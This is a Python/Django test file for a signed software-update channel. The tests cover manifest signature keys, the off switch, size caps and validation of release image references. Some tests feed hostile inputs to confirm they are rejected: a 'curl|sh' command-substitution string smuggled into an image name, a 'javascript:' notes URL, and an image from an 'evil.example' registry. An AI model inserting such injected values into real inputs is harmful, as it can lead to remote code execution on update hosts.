"""The morpheus.direct channel: defaults, the key list, the off switch, the new fields."""

from __future__ import annotations

import json
from unittest import mock

from django.conf import settings
from django.test import SimpleTestCase, override_settings

from core.signing import generate_keypair, sign_manifest
from core.update_sources import SignedManifestSource, check_for_update

URL = 'https://updates.example.test/stable.json'
COMMIT = 'a' * 40
IMAGE = 'ghcr.io/magnetoid/morpheus:' + COMMIT + '@sha256:' + 'd' * 64


def _core(**over):
    core = {
        'version': 'v9.0.0',
        'commit': COMMIT,
        'image': IMAGE,
        'notes': 'Notes',
        'notes_url': 'https://github.com/magnetoid/Morpheus/releases/tag/v9.0.0',
        'breaking': True,
    }
    core.update(over)
    return core


def _signed(private, **over):
    return sign_manifest({'channel': 'stable', 'core': _core(**over)}, private)


class _Resp:
    def __init__(self, body: bytes):
        self._body = body

    def read(self, size=-1):
        return self._body

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False


def _serve(doc):
    body = doc if isinstance(doc, bytes) else json.dumps(doc).encode()
    return mock.patch('core.update_sources.urllib.request.urlopen', return_value=_Resp(body))


class UpdateChannelTests(SimpleTestCase):
    def test_tests_run_with_no_channel(self):
        self.assertEqual(settings.MORPHEUS_UPDATE_MANIFEST_URL, '')
        self.assertEqual(settings.MORPHEUS_UPDATE_PUBLIC_KEY, '')

    def test_off_turns_the_check_off(self):
        with (
            override_settings(
                MORPHEUS_UPDATE_MANIFEST_URL='off', MORPHEUS_UPDATE_REPO='magnetoid/Morpheus'
            ),
            mock.patch('core.update_sources.urllib.request.urlopen') as urlopen,
        ):
            result = check_for_update('v1.0.0')
        self.assertEqual(result['available'], 'unavailable')
        self.assertIn('off', result['reason'])
        urlopen.assert_not_called()

    def test_either_listed_key_verifies(self):
        _, a = generate_keypair()
        priv_b, b = generate_keypair()
        with _serve(_signed(priv_b)), self.assertLogs('morpheus.signing', 'WARNING'):
            release = SignedManifestSource(URL, f'{a},{b}').latest()
        self.assertEqual(release.version, 'v9.0.0')

    def test_an_unknown_key_is_ignored(self):
        _, a = generate_keypair()
        _, b = generate_keypair()
        priv_c, _ = generate_keypair()
        with (
            _serve(_signed(priv_c)),
            self.assertLogs('morpheus.updates', 'ERROR'),
            self.assertLogs('morpheus.signing', 'WARNING'),
        ):
            release = SignedManifestSource(URL, f'{a},{b}').latest()
        self.assertIsNone(release)

    def test_user_agent_names_the_version_only(self):
        priv, pub = generate_keypair()
        with (
            override_settings(MORPHEUS_VERSION='v9.9.9'),
            _serve(_signed(priv)) as urlopen,
        ):
            SignedManifestSource(URL, pub).latest()
        req = urlopen.call_args.args[0]
        self.assertEqual(req.get_header('User-agent'), 'morpheus-updater/v9.9.9')
        self.assertEqual({k.lower() for k in dict(req.header_items())}, {'user-agent', 'accept'})

    def test_reads_commit_image_breaking_and_notes_url(self):
        priv, pub = generate_keypair()
        with _serve(_signed(priv)):
            release = SignedManifestSource(URL, pub).latest()
        self.assertEqual(release.commit, COMMIT)
        self.assertEqual(release.image, IMAGE)
        self.assertIs(release.breaking, True)
        self.assertEqual(release.url, 'https://github.com/magnetoid/Morpheus/releases/tag/v9.0.0')

    def test_check_for_update_carries_the_release_fields(self):
        priv, pub = generate_keypair()
        with (
            override_settings(MORPHEUS_UPDATE_MANIFEST_URL=URL, MORPHEUS_UPDATE_PUBLIC_KEY=pub),
            _serve(_signed(priv)),
        ):
            result = check_for_update('v1.0.0')
        self.assertEqual(result['commit'], COMMIT)
        self.assertEqual(result['image'], IMAGE)
        self.assertIs(result['breaking'], True)
        self.assertEqual(result['notes'], 'Notes')
        self.assertEqual(
            result['notes_url'], 'https://github.com/magnetoid/Morpheus/releases/tag/v9.0.0'
        )

    def test_a_malformed_commit_is_dropped(self):
        priv, pub = generate_keypair()
        with _serve(_signed(priv, commit='abc')):
            release = SignedManifestSource(URL, pub).latest()
        self.assertEqual(release.commit, '')

    def test_the_baked_release_key_refuses_a_foreign_image(self):
        priv, pub = generate_keypair()
        foreign = 'evil.example/x:' + COMMIT + '@sha256:' + 'd' * 64
        for image in (foreign, 'ghcr.io/magnetoid/morpheus:' + COMMIT):
            with (
                self.subTest(image=image),
                override_settings(MORPHEUS_UPDATE_RELEASE_KEY=pub),
                _serve(_signed(priv, image=image)),
            ):
                release = SignedManifestSource(settings.MORPHEUS_UPDATE_CHANNEL_URL, pub).latest()
                self.assertEqual(release.image, '')

    def test_a_fork_channel_may_name_its_own_registry(self):
        priv, pub = generate_keypair()
        own = 'registry.example/fork:' + COMMIT + '@sha256:' + 'd' * 64
        with _serve(_signed(priv, image=own)):
            self.assertEqual(SignedManifestSource(URL, pub).latest().image, own)

    def test_an_html_answer_is_unknown(self):
        with (
            override_settings(
                MORPHEUS_UPDATE_MANIFEST_URL=URL, MORPHEUS_UPDATE_PUBLIC_KEY=generate_keypair()[1]
            ),
            _serve(b'<!doctype html><html>'),
            self.assertLogs('morpheus.updates', 'WARNING'),
        ):
            result = check_for_update('v1.0.0')
        self.assertEqual(result['available'], 'unknown')


class NotesUrlTests(SimpleTestCase):
    def test_a_non_https_notes_url_is_dropped(self):
        priv, pub = generate_keypair()
        with _serve(_signed(priv, notes_url='javascript:alert(1)')):
            release = SignedManifestSource(URL, pub).latest()
        self.assertEqual(release.url, '')


class ImageBindingTests(SimpleTestCase):
    def _image(self, priv, pub, image, *, release_key=None, url=URL):
        with (
            override_settings(MORPHEUS_UPDATE_RELEASE_KEY=release_key or generate_keypair()[1]),
            _serve(_signed(priv, image=image)),
        ):
            return SignedManifestSource(url, pub).latest().image

    def test_a_tag_that_is_not_the_commit_is_dropped(self):
        priv, pub = generate_keypair()
        image = 'ghcr.io/magnetoid/morpheus:' + 'b' * 40 + '@sha256:' + 'd' * 64
        self.assertEqual(self._image(priv, pub, image), '')

    def test_a_shell_in_the_repo_is_dropped(self):
        priv, pub = generate_keypair()
        image = 'ghcr.io/magnetoid/morpheus:$(curl${IFS}x|sh):' + COMMIT + '@sha256:' + 'd' * 64
        self.assertEqual(self._image(priv, pub, image), '')

    def test_an_uppercase_repo_is_dropped(self):
        priv, pub = generate_keypair()
        image = 'ghcr.io/Magnetoid/morpheus:' + COMMIT + '@sha256:' + 'd' * 64
        self.assertEqual(self._image(priv, pub, image), '')

    def test_a_fork_without_the_baked_key_keeps_its_registry_with_a_port(self):
        priv, pub = generate_keypair()
        image = 'registry.example.com:5000/acme/shop:' + COMMIT + '@sha256:' + 'd' * 64
        self.assertEqual(self._image(priv, pub, image), image)

    def test_the_baked_key_enforces_our_repo_whatever_the_url(self):
        priv, pub = generate_keypair()
        foreign = 'registry.example.com/acme/shop:' + COMMIT + '@sha256:' + 'd' * 64
        ours = 'ghcr.io/magnetoid/morpheus:' + COMMIT + '@sha256:' + 'd' * 64
        for url in (settings.MORPHEUS_UPDATE_CHANNEL_URL + '?', URL):
            with self.subTest(url=url):
                self.assertEqual(self._image(priv, pub, foreign, release_key=pub, url=url), '')
                self.assertEqual(self._image(priv, pub, ours, release_key=pub, url=url), ours)

    def test_an_image_needs_a_valid_commit(self):
        priv, pub = generate_keypair()
        with _serve(_signed(priv, commit='abc')):
            self.assertEqual(SignedManifestSource(URL, pub).latest().image, '')


class ManifestEdgeTests(SimpleTestCase):
    def test_a_trailing_newline_commit_is_dropped(self):
        priv, pub = generate_keypair()
        with _serve(_signed(priv, commit=COMMIT + '\n')):
            self.assertEqual(SignedManifestSource(URL, pub).latest().commit, '')

    def test_a_core_that_is_not_an_object_is_no_release(self):
        priv, pub = generate_keypair()
        for core in ('v9.0.0', ['x'], 5):
            doc = sign_manifest({'channel': 'stable', 'core': core}, priv)
            with self.subTest(core=core), _serve(doc):
                self.assertIsNone(SignedManifestSource(URL, pub).latest())

    def test_an_oversized_manifest_is_unreachable(self):
        priv, pub = generate_keypair()
        doc = _signed(priv)
        doc['padding'] = 'x' * (256 * 1024)
        with _serve(doc), self.assertLogs('morpheus.updates', 'WARNING'):
            self.assertIsNone(SignedManifestSource(URL, pub).latest())

    def test_the_read_is_capped(self):
        priv, pub = generate_keypair()
        resp = mock.MagicMock()
        resp.__enter__.return_value.read.return_value = json.dumps(_signed(priv)).encode()
        with mock.patch('core.update_sources.urllib.request.urlopen', return_value=resp):
            SignedManifestSource(URL, pub).latest()
        resp.__enter__.return_value.read.assert_called_once_with(256 * 1024 + 1)

    def test_a_bad_signature_says_so_not_unreachable(self):
        priv, _ = generate_keypair()
        _, other = generate_keypair()
        with (
            override_settings(MORPHEUS_UPDATE_MANIFEST_URL=URL, MORPHEUS_UPDATE_PUBLIC_KEY=other),
            _serve(_signed(priv)),
            self.assertLogs('morpheus.updates', 'ERROR'),
            self.assertLogs('morpheus.signing', 'WARNING'),
        ):
            result = check_for_update('v1.0.0')
        self.assertEqual(result['available'], 'unknown')
        self.assertIn('signature did not match', result['reason'])
        self.assertIn('take the next release by hand', result['reason'])
        self.assertNotIn('unreachable', result['reason'])
